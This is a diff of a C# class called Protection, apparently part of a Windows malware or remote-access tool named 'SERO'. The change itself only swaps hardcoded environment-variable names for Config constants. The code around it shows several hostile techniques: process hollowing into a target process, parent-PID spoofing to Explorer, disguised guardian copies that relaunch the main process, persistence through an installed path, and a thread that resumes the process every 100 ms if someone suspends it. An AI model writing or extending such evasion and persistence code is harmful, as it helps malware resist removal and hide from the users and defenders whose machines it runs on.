@@ -817,7 +817,7 @@ internal static partial class Protection
             try
             {
                 var exePath = Persistence.GetInstalledPath(Config.PersistName)
-                    ?? Environment.GetEnvironmentVariable("SERO_EXE")
+                    ?? Environment.GetEnvironmentVariable(Config.EnvKeyExe)
                     ?? Environment.ProcessPath;
                 if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                 {
@@ -950,10 +950,10 @@ internal static partial class Protection
             newPid = ProcessHollowing.Hollow(exePath, target, skipPpidSpoof: false,
                 envOverrides: new Dictionary<string, string?>
                 {
-                    ["SERO_GUARDIAN"]              = selfPid.ToString(),
+                    [Config.EnvKeyGuardian]        = selfPid.ToString(),
                     ["SERO_MAIN_PID"]              = selfPid.ToString(),
                     [ProcessHollowing.HOLLOW_ENV_KEY] = ProcessHollowing.HOLLOW_ENV_VAL,
-                    ["SERO_EXE"]                   = exePath,
+                    [Config.EnvKeyExe]             = exePath,
                 });
         }
         else
@@ -961,10 +961,10 @@ internal static partial class Protection
             var disguisedPath = PrepareGuardianCopy(slot, exePath) ?? exePath;
             newPid = ProcessHollowing.SpawnDetached(disguisedPath, new Dictionary<string, string?>
             {
-                ["SERO_GUARDIAN"]              = selfPid.ToString(),
+                [Config.EnvKeyGuardian]        = selfPid.ToString(),
                 ["SERO_MAIN_PID"]              = selfPid.ToString(),
                 [ProcessHollowing.HOLLOW_ENV_KEY] = null,
-                ["SERO_EXE"]                   = exePath,
+                [Config.EnvKeyExe]             = exePath,
                 ["SERO_GUARDIAN_SELF"]         = disguisedPath,
             });
         }
@@ -982,7 +982,7 @@ internal static partial class Protection
     {
         // Temporarily inject SERO_GUARDIAN into our env so the hollowed child inherits it.
         // SERO_MAIN_PID and SERO_EXE are already correctly set in our env.
-        Environment.SetEnvironmentVariable("SERO_GUARDIAN", selfPid.ToString());
+        Environment.SetEnvironmentVariable(Config.EnvKeyGuardian, selfPid.ToString());
         try
         {
             // Hollow our PE into the target. PPID-spoofed to Explorer (skipPpidSpoof=false).
@@ -992,7 +992,7 @@ internal static partial class Protection
         finally
         {
             // Clear immediately — child already inherited a snapshot of our env at CreateProcess time
-            Environment.SetEnvironmentVariable("SERO_GUARDIAN", null);
+            Environment.SetEnvironmentVariable(Config.EnvKeyGuardian, null);
         }
     }
 
@@ -1003,7 +1003,7 @@ internal static partial class Protection
     /// </summary>
     public static bool RunAsGuardianIfNeeded()
     {
-        var guardianEnv = Environment.GetEnvironmentVariable("SERO_GUARDIAN");
+        var guardianEnv = Environment.GetEnvironmentVariable(Config.EnvKeyGuardian);
         if (string.IsNullOrEmpty(guardianEnv) || !int.TryParse(guardianEnv, out int parentPid))
             return false;
 
@@ -1020,7 +1020,7 @@ internal static partial class Protection
         // Clear SERO_GUARDIAN from our own environment so that when we
         // relaunch the main process, it does NOT inherit this variable and
         // doesn't accidentally become another guardian.
-        Environment.SetEnvironmentVariable("SERO_GUARDIAN", null);
+        Environment.SetEnvironmentVariable(Config.EnvKeyGuardian, null);
 
         // Anti-suspend: keep the main process running even if an attacker suspends it.
         // This thread calls NtResumeProcess every 100 ms and exits when the main process dies.
@@ -1191,7 +1191,7 @@ internal static partial class Protection
         try
         {
             var exePath = Persistence.GetInstalledPath(Config.PersistName)
-                ?? Environment.GetEnvironmentVariable("SERO_EXE")
+                ?? Environment.GetEnvironmentVariable(Config.EnvKeyExe)
                 ?? Environment.ProcessPath;
 
             if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
@@ -1206,10 +1206,10 @@ internal static partial class Protection
             // can distinguish it from a direct user re-run and enforce the stop flag.
             int pid = ProcessHollowing.SpawnDetached(exePath, new Dictionary<string, string?>
             {
-                ["SERO_GUARDIAN"]         = null,
+                [Config.EnvKeyGuardian]           = null,
                 [ProcessHollowing.HOLLOW_ENV_KEY] = null,
-                ["SERO_EXE"]              = exePath,
-                ["SERO_RELAUNCH"]         = "1",
+                [Config.EnvKeyExe]                = exePath,
+                [Config.EnvKeyRelaunch]           = "1",
             });
 
             if (pid > 0)
